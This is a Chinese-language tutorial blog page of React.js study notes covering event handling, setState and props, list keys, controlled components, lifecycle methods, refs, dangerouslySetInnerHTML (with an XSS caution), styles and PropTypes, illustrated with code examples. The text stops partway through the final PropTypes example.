<h1 id="事件监听"><a href="#事件监听" class="headerlink" title="事件监听"></a>事件监听</h1><p> React.js 不需要手动调用浏览器原生的 addEventListener 进行事件监听。<br> React.js 封装好了一系列的 on<em> 的属性，当需要为某个元素监听某个事件的时候，只需要简单地给它加上 on</em> 就可以了。<br> 而且不需要考虑不同浏览器兼容性的问题，React.js 都封装好了这些细节。</p>
<p> 但是要注意，没有经过特殊处理的话，这些 on* 的事件监听只能用在普通的 HTML 的标签上，而不能用在组件标签上</p>
<p> React.js 会给每个事件监听传入一个 event 对象，这个对象提供的功能和浏览器提供的功能一致，而且它是兼容所有浏览器的。</p>
<p> React.js 的事件监听方法需要手动 bind 到当前实例，这种模式在 React.js 中非常常用。不然监听事件调用的方法里面的this是undefined<br> 另外可以在bind 的时候传参</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">class Title extends Component &#123;</span><br><span class="line"> handleClickOnTitle (e) &#123;</span><br><span class="line">    console.log(this)//undefined</span><br><span class="line">    console.log(e.target.innerHTML)//hello React</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render () &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;h1 onClick=&#123;this.handleClickOnTitle&#125;&gt;hello React&lt;/h1&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Title extends Component &#123;</span><br><span class="line"> handleClickOnTitle (word, e) &#123;</span><br><span class="line">    console.log(this, word)//Title 对象，“hello”</span><br><span class="line">    console.log(e.target.innerHTML)//hello React</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render () &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;h1 onClick=&#123;this.handleClickOnTitle.bind(this, &apos;Hello&apos;)&#125;&gt;hello React &lt;/h1&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="setState函数和pros"><a href="#setState函数和pros" class="headerlink" title="setState函数和pros"></a>setState函数和pros</h1><p>一个组件的显示形态是可以由它数据状态(state)和配置参数(pros)决定的，即两种方式控制组件显示形态</p>
<h2 id="方式一：利用state的值-通过渲染控制显示状态"><a href="#方式一：利用state的值-通过渲染控制显示状态" class="headerlink" title="方式一：利用state的值,通过渲染控制显示状态"></a>方式一：利用state的值,通过渲染控制显示状态</h2><p>一个组件可以拥有自己的状态,React.js 的 state 用来存储这种可变化的状态,再让setState函数根据state的值重新渲染组件到页面<br>setState 方法由父类 Component 所提供。当调用这个函数的时候，React.js 会更新组件的状态 state ，并且重新调用 render 方法，然后再把 render 方法所渲染的最新的内容显示到页面上。<br>注意，当要改变组件的状态的时候，不能直接用 this.state = xxx 这种方式来修改，如果这样做 React.js 就没办法知道你修改了组件的状态，它也就没有办法更新页面。所以，一定要使用 React.js 提供的 setState 方法，它接受一个对象或者函数作为参数。</p>
<p>传入一个对象的时候，这个对象表示该组件的新状态。但只需要传入需要更新的部分就可以了，而不需要传入整个对象<br>要注意的是，当调用 setState 的时候，React.js 并不会马上修改 state。而是把这个对象放到一个更新队列里面，稍后才会从队列当中把新的状态提取出来合并到 state 当中，然后再触发组件更新</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">handleClickOnLikeButton () &#123;</span><br><span class="line">    console.log(this.state.isLiked)</span><br><span class="line">    this.setState(&#123;</span><br><span class="line">      isLiked: !this.state.isLiked</span><br><span class="line">    &#125;)</span><br><span class="line">    console.log(this.state.isLiked) //第二次打印的就是第一次打印的值</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>如果需要多次setState,而且后续传入参数依赖前一个setState 参数，这时就要用函数做setState参数，<br>React.js 会把上一个 setState 的结果传入这个函数，你就可以使用该结果进行运算、操作，然后返回一个对象作为更新 state 的对象<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">handleClickOnLikeButton () &#123;</span><br><span class="line"></span><br><span class="line">    // this.setState(&#123; count: 0 &#125;) // =&gt; this.state.count 还是 undefined</span><br><span class="line">    // this.setState(&#123; count: this.state.count + 1&#125;) // =&gt; undefined + 1 = NaN</span><br><span class="line">    // this.setState(&#123; count: this.state.count + 2&#125;) //最终结果为NAN</span><br><span class="line"></span><br><span class="line">    this.setState((prevState) =&gt; &#123;</span><br><span class="line">      return &#123; count: 0 &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    this.setState((prevState) =&gt; &#123;</span><br><span class="line">      return &#123; count: prevState.count + 1 &#125; // 上一个 setState 的返回是 count 为 0，当前返回 1</span><br><span class="line">    &#125;)</span><br><span class="line">    this.setState((prevState) =&gt; &#123;</span><br><span class="line">      return &#123; count: prevState.count + 2 &#125; // 上一个 setState 的返回是 count 为 1，当前返回 3</span><br><span class="line">    &#125;)</span><br><span class="line">    // 最后的结果是 this.state.count 为 3，所以如果JSX中如果显示count,则显示3</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<p>多次调用setState只会返回多次运行后的结果，React.js 内部会把 JavaScript 事件循环中的消息队列的同一个消息中的 setState 都进行合并以后再重新渲染组件。</p>
<h2 id="方式二：在JSX中使用自定义组件时，传入配置属性，根据属性显示状态"><a href="#方式二：在JSX中使用自定义组件时，传入配置属性，根据属性显示状态" class="headerlink" title="方式二：在JSX中使用自定义组件时，传入配置属性，根据属性显示状态"></a>方式二：在JSX中使用自定义组件时，传入配置属性，根据属性显示状态</h2><p>在使用一个组件的时候，可以把参数放在标签的属性当中，所有的属性都会作为 props 对象的键值<br>组件内部就可以通过 this.props 来访问到这些配置参数<br>可以把任何类型的数据作为组件的参数，包括字符串、数字、对象、数组、甚至是函数等等<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">class Index extends Component &#123;</span><br><span class="line">  render () &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;LikeButton wordings=&#123;&#123;likedText: &apos;已赞&apos;, unlikedText: &apos;赞&apos;&#125;&#125;</span><br><span class="line">        onClick=&#123;() =&gt; console.log(&apos;Click on like button!&apos;)/&gt; //这里onclick可以被当做属性访问到</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">//LikeButton 类</span><br><span class="line">handleClickOnLikeButton () &#123;</span><br><span class="line"></span><br><span class="line">    this.setState(&#123;</span><br><span class="line">      isLiked: !this.state.isLiked</span><br><span class="line">    &#125;)</span><br><span class="line">    if (this.props.onClick) &#123; //这里的onclick是使用&lt;LikeButton /&gt;时定义的属性</span><br><span class="line">      this.props.onClick() //这里的函数通过属性传递进来，不是组件自己实现</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">render()return 的JSX的button onclick事件绑定handleClickOnLikeButton函数</span><br></pre></td></tr></table></figure></p>
<p>JSX 的{}内可以嵌入任何表达式,{ {} }就是在 {} 内部用对象}字面量返回一个对象而已,<br>this.props.wordings就是对象{ likedText: ‘已赞’, unlikedText: ‘赞’} </p>
<p>可以用defaultProps配置默认属性,这样就不需要判断配置属性是否传进来了,如果没有传进来，会直接使用 defaultProps 中的默认属性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">class LikeButton extends Component &#123;</span><br><span class="line">  static defaultProps = &#123;</span><br><span class="line">    likedText: &apos;取消&apos;,</span><br><span class="line">    unlikedText: &apos;点赞&apos;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  constructor () &#123;</span><br><span class="line">    super()</span><br><span class="line">    this.state = &#123; isLiked: false &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  handleClickOnLikeButton () &#123;</span><br><span class="line">    this.setState(&#123;</span><br><span class="line">      isLiked: !this.state.isLiked</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render () &#123;</span><br><span class="line">  //不需要在这里向下面这样判断是否传进来了配置属性,如果配置了wordings就用wordings，否则用后面&#123;&#125;内的默认值</span><br><span class="line">  &lt;!-- const wordings = this.props.wordings || &#123;</span><br><span class="line">      likedText: &apos;取消&apos;,</span><br><span class="line">      unlikedText: &apos;点赞&apos;</span><br><span class="line">    &#125; --&gt;</span><br><span class="line">    return (</span><br><span class="line">      &lt;button onClick=&#123;this.handleClickOnLikeButton.bind(this)&#125;&gt;</span><br><span class="line">        &#123;this.state.isLiked</span><br><span class="line">          ? this.props.likedText //直接使用</span><br><span class="line">          : this.props.unlikedText&#125; 👍</span><br><span class="line">      &lt;/button&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个组件在输入确定的 props 的时候，能够输出确定的 UI 显示形态。如果想修改props决定的显示形态，可以主动通过重新渲染的方式，<br>把新的props传入到组件当中，这样这个组件中由 props 决定的显示形态也会得到相应的改变。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">class Index extends Component &#123;</span><br><span class="line">  constructor () &#123;</span><br><span class="line">    super()</span><br><span class="line">    this.state = &#123;</span><br><span class="line">      likedText: &apos;已赞&apos;,</span><br><span class="line">      unlikedText: &apos;赞&apos;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  handleClickOnChange () &#123;</span><br><span class="line">    this.setState(&#123;</span><br><span class="line">      likedText: &apos;取消&apos;,</span><br><span class="line">      unlikedText: &apos;点赞&apos;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render () &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;LikeButton</span><br><span class="line">          likedText=&#123;this.state.likedText&#125;</span><br><span class="line">          unlikedText=&#123;this.state.unlikedText&#125; /&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">          &lt;button onClick=&#123;this.handleClickOnChange.bind(this)&#125;&gt;</span><br><span class="line">            修改 wordings</span><br><span class="line">          &lt;/button&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>即props 一旦传入,你就不可以在组件内部对它进行修改，但是可以通过父组件主动重新渲染的方式来传入新的 props，从而达到更新的效果</p>
<p>小结<br>state 是让组件控制自己的状态，props 是让外部对组件自己进行配置。<br>没有 state 的组件叫无状态组件（stateless component），设置了 state 的叫做有状态组件（stateful component）<br>因为状态会带来管理的复杂性，所以尽量多地写无状态组件，尽量少地写有状态的组件。这样会降低代码维护的难度，也会在一定程度上增强组件的可复用性。</p>
<h1 id="函数式组件"><a href="#函数式组件" class="headerlink" title="函数式组件"></a>函数式组件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">//普通写法</span><br><span class="line">class HelloWorld extends Component &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    super()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  sayHi () &#123;</span><br><span class="line">    alert(&apos;Hello World&apos;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render () &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;div onClick=&#123;this.sayHi.bind(this)&#125;&gt;Hello World&lt;/div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//函数式组件的编写方式</span><br><span class="line">const HelloWorld = (props) =&gt; &#123;</span><br><span class="line">  const sayHi = (event) =&gt; alert(&apos;Hello World&apos;)</span><br><span class="line">  return (</span><br><span class="line">    &lt;div onClick=&#123;sayHi&#125;&gt;Hello World&lt;/div&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以前一个组件是通过继承 Component 来构建，一个子类就是一个组件。而用函数式的组件编写方式是一个函数就是一个组件，但使用方法同普通写法<br>函数式组件只能接受 props 而无法像跟类组件一样可以在 constructor 里面初始化 state。你可以理解函数式组件就是一种只能接受 props 和提供 render 方法的类组件。</p>
<h1 id="渲染列表数据"><a href="#渲染列表数据" class="headerlink" title="渲染列表数据"></a>渲染列表数据</h1><p>如果往 {} 放一个数组，React.js 会帮你把数组里面一个个元素罗列并且渲染出来，如果数组每一项是JSX，就可以将数据渲染到html里面了<br>所以react渲染列表的思路就是,将数组数据利用es6的map方法转换成JSX,再将JSX数组放到render()返回值中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class Index extends Component &#123;</span><br><span class="line">  render () &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &#123;users.map((user) =&gt; &#123;</span><br><span class="line">          return (</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">              &lt;div&gt;姓名：&#123;user.username&#125;&lt;/div&gt;</span><br><span class="line">              &lt;div&gt;年龄：&#123;user.age&#125;&lt;/div&gt;</span><br><span class="line">              &lt;div&gt;性别：&#123;user.gender&#125;&lt;/div&gt;</span><br><span class="line">              &lt;hr /&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">          )</span><br><span class="line">        &#125;)&#125;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>进一步优化,将数组每项JSX抽离成自定义组件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">const users = [</span><br><span class="line">  &#123; username: &apos;Jerry&apos;, age: 21, gender: &apos;male&apos; &#125;,</span><br><span class="line">  &#123; username: &apos;Tomy&apos;, age: 22, gender: &apos;male&apos; &#125;,</span><br><span class="line">  &#123; username: &apos;Lily&apos;, age: 19, gender: &apos;female&apos; &#125;,</span><br><span class="line">  &#123; username: &apos;Lucy&apos;, age: 20, gender: &apos;female&apos; &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">class User extends Component &#123;</span><br><span class="line">  render () &#123;</span><br><span class="line">    const &#123; user &#125; = this.props</span><br><span class="line">    return (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;div&gt;姓名：&#123;user.username&#125;&lt;/div&gt;</span><br><span class="line">        &lt;div&gt;年龄：&#123;user.age&#125;&lt;/div&gt;</span><br><span class="line">        &lt;div&gt;性别：&#123;user.gender&#125;&lt;/div&gt;</span><br><span class="line">        &lt;hr /&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Index extends Component &#123;</span><br><span class="line">  render () &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &#123;users.map((user) =&gt; &lt;User user=&#123;user&#125; /&gt;)&#125;</span><br><span class="line">        &lt;!-- &#123;users.map((user, i) =&gt; &lt;User key=&#123;i&#125; user=&#123;user&#125; /&gt;)&#125; --&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">  &lt;Index /&gt;,</span><br><span class="line">  document.getElementById(&apos;root&apos;)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
<p>但是要注意<br>对于用表达式套数组罗列到页面上的元素，都要为每个元素加上 key 属性，这个 key 必须是每个元素唯一的标识<br>这里用循环计数器 i 作为 key对循环标签User添加key,就不会报需要key的错了<br>{users.map((user) =&gt; <user user="\{user\}">)} 变成 {users.map((user, i) =&gt; <user key="\{i\}" user="\{user\}">)}</user></user></p>
<h1 id="受控组件"><a href="#受控组件" class="headerlink" title="受控组件"></a>受控组件</h1><p>类似于 &lt;input /&gt;、&lt;select /&gt;、&lt;textarea&gt; 这些元素的 value 值被 React.js 所控制、渲染的组件，在 React.js 当中被称为受控组件（Controlled Component）。对于用户可输入的控件，一般都可以让它们成为受控组件.<br>React.js 认为所有的状态都应该由 React.js 的 state 控制，只要类似于 &lt;input /&gt;、&lt;textarea /&gt;、&lt;select /&gt; 这样的输入控件被设置了 value 值，那么它们的值等于state的一个属性值，就会永远以被设置的值为准。值不变，value 就不会变化。<br>在 React.js 当中必须要用 setState 才能更新组件的内容,所以可以通过给输入框绑定监听输入框的 onChange 事件，然后获取到用户输入的内容，再通过 setState 的方式更新 state 中的 value属性绑定的值，这样 输入框的内容才会更新。</p>
<p>子组件可以利用props向父组件传递数据，即，父组件在使用子组件时，添加属性A，并将该A属性值赋值为一个父组件的函数B，<br>子组件在触发数据提交的时候，检查自己的props有没有属性A,如果有的话，将数据以参数的形式，传递给属性A，即<br>this.props.A({key1:value1,key2”value2….})<br>父组件函数B通过函数参数就可以获得传递过来的数据</p>
<p>子组件从父组件获取数据，同样使用props,也就是说，父组件在使用子组件的时候把自己的state的一个属性C赋值给子组件的属性D,<br>子组件通过属性D获取父组件传递过来的数据,在子组件中直接使用props.D的值，但要注意给子组件设置defaultProps，给属性D一个默认值，防止出现不传值的情况<br>这种行为叫做“状态提升”<br>如果将属性D的值，再保存到子组件的state中在使用，那么当其他组件也需要这份数据的时候，将无法使用，因为根本没办法访问,因此采用使用props值的办法，将这种组件之间共享的状态交给组件最近的公共父节点保管，然后通过 props 把状态传递给子组件，这样就可以在组件之间共享数据了</p>
<p>当某个状态被多个组件依赖或者影响的时候，就把该状态提升到这些组件的最近公共父组件中去管理，用 props 传递数据或者函数来管理这种依赖或着影响的行为。<br>对于不会被多个组件依赖和影响的状态（例如某种下拉菜单的展开和收起状态），一般来说只需要保存在组件内部即可，不需要做提升或者特殊的管理。</p>
<h1 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h1><h2 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h2><p>React.js 将组件渲染，并且构造 DOM 元素然后塞入页面的过程称为组件的挂载<br>挂载过程:<br>-&gt; constructor() //自身的状态的初始化工作<br>-&gt; componentWillMount()//组件还没挂载完成时进行的组件启动工作，例如 Ajax 数据拉取、定时器的启动。<br>-&gt; render()<br>// 然后构造 DOM 元素插入页面<br>-&gt; componentDidMount() //组件挂载完成以后，也就是 DOM 元素已经插入页面后调用。进行依赖DOM的启动工作<br>// …<br>// 即将从页面中删除, setState 只能在已经挂载或者正在挂载的组件上调用,<br>//组件隐藏的时候，组件的回调函数可能还在不停地尝试 setState,因此会报错<br>-&gt; componentWillUnmount() //组件对应的 DOM 元素从页面中删除之前调用,处理数据清理工作，如定时器的清理<br>// 从页面中删除</p>
<h2 id="更新阶段"><a href="#更新阶段" class="headerlink" title="更新阶段"></a>更新阶段</h2><p> setState 导致 React.js 重新渲染组件并且把组件的变化应用到 DOM 元素上的过程，这是一个组件的变化过程。而 React.js 也提供了一系列的生命周期函数可以让我们在这个组件更新的过程执行一些操作。<br> 关于更新阶段的组件生命周期：<br>shouldComponentUpdate(nextProps, nextState)：你可以通过这个方法控制组件是否重新渲染。如果返回 false 组件就不会重新渲染。这个生命周期在 React.js 性能优化上非常有用。<br>componentWillReceiveProps(nextProps)：组件从父组件接收到新的 props 之前调用。<br>componentWillUpdate()：组件开始重新渲染之前调用。<br>componentDidUpdate()：组件重新渲染并且把更改变更到真实的 DOM 以后调用。<br><a href="https://reactjs.org/docs/react-component.html" target="_blank" rel="noopener">官方文档</a></p>
<h1 id="ref属性"><a href="#ref属性" class="headerlink" title="ref属性"></a>ref属性</h1><p>通过在html标签或自定义的组件标签中添加 ref属性，可以绑定DOM操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class AutoFocusInput extends Component &#123;</span><br><span class="line">  componentDidMount () &#123; //利用组件声明周期函数</span><br><span class="line">    this.input.focus() //这里的this.input就是页面里的DOM元素，因此可以直接使用DOM API</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render () &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;input ref=&#123;(input) =&gt; this.input = input&#125; /&gt; //把input标签DOM元素挂到组件的属性input上</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>input 元素加了一个 ref 属性，这个属性值是一个函数,<br>当 input 元素在页面上挂载完成以后，React.js 就会调用这个函数,函数的参数，就是挂载以后的DOM结点<br>在函数中把这个 DOM 元素设置为组件实例的一个属性，这样就可以通过 this.input 获取到这个 DOM 元素。</p>
<p>但注意,能不用 ref 就不用，因为React.js 本来就可以做到的页面自动更新的操作和事件监听，多余DOM操作，不利于理解和维护</p>
<h1 id="dangerouslySetHTML"><a href="#dangerouslySetHTML" class="headerlink" title="dangerouslySetHTML"></a>dangerouslySetHTML</h1><p>dangerouslySetInnerHTML 属性可以用于动态渲染HTML结构,即将HTML字符串，在页面中显示时,当做HTML去渲染<br>给 dangerouslySetInnerHTML 传入一个对象，这个对象的 __html 属性值就相当于元素的 innerHTML，这样就可以动态渲染元素的 innerHTML 结构了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">constructor() &#123;</span><br><span class="line">    super()</span><br><span class="line">    this.state = &#123;</span><br><span class="line">      content: &apos;&lt;h1&gt;React.js cool!&lt;/h1&gt;&apos;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">render () &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;div</span><br><span class="line">        className=&apos;editor-wrapper&apos;</span><br><span class="line">        dangerouslySetInnerHTML=&#123;&#123;__html: this.state.content&#125;&#125; /&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<p>因为设置 innerHTML 可能会导致跨站脚本攻击（XSS），所以 React.js 团队认为把事情搞复杂可以防止（警示）大家滥用这个属性。这个属性不必要的情况就不要使用</p>
<h1 id="style"><a href="#style" class="headerlink" title="style"></a>style</h1><p>在 React.js 中需要把 CSS 属性变成一个对象再传给元素<br>style 接受一个对象，这个对象里面是这个元素的 CSS 属性键值对，原来 CSS 属性中带 - 的元素都必须要去掉 - 换成驼峰命名，如 font-size 换成 fontSize，text-align 换成 textAlign。<br>用对象作为 style 方便动态设置元素的样式。可以用 props 或者 state 中的数据生成样式对象再传给元素，然后用 setState 就可以修改样式，非常灵活</p>
<p>&lt;h1 style={ {fontSize: ‘12px’, color: this.state.color} }&gt;React.js color&lt;/h1&gt;</p>
<h1 id="PropTypes-组件参数类型验证"><a href="#PropTypes-组件参数类型验证" class="headerlink" title="PropTypes 组件参数类型验证"></a>PropTypes 组件参数类型验证</h1><p>给组件的配置参数加上类型验证,就可以验证传进组件的参数是否符合预定的数据类型，报错也能定位问题<br>PropTypes就是react第三方库，用于验证参数类型，即验证传入组件的数据的数据类型<br>npm install –save prop-types<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import React, &#123; Component &#125; from &apos;react&apos;</span><br><span class="line">import PropTypes from &apos;prop-types&apos;</span><br><span class="line"></span><br><span class="line">class Comment extends Component &#123;</span><br><span class="line">  static propTypes = &#123;</span><br><span class="line">    comment: PropTypes.object //指定传入comment的类型必须为Object</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render () &#123;</span><br><span class="line">    const &#123; comment &#125; = this.props</span><br><span class="line">    return (</span><br><span class="line">      &lt;div className=&apos;comment&apos;&gt;</span><br><span class="line">        &lt;div className=&apos;comment-user&apos;&gt;</span><br><span class="line">          &lt;span&gt;&#123;comment.username&#125; &lt;/span&gt;：</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;p&gt;&#123;comment.content&#125;&lt;/p&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    )</span><br><span class="line">  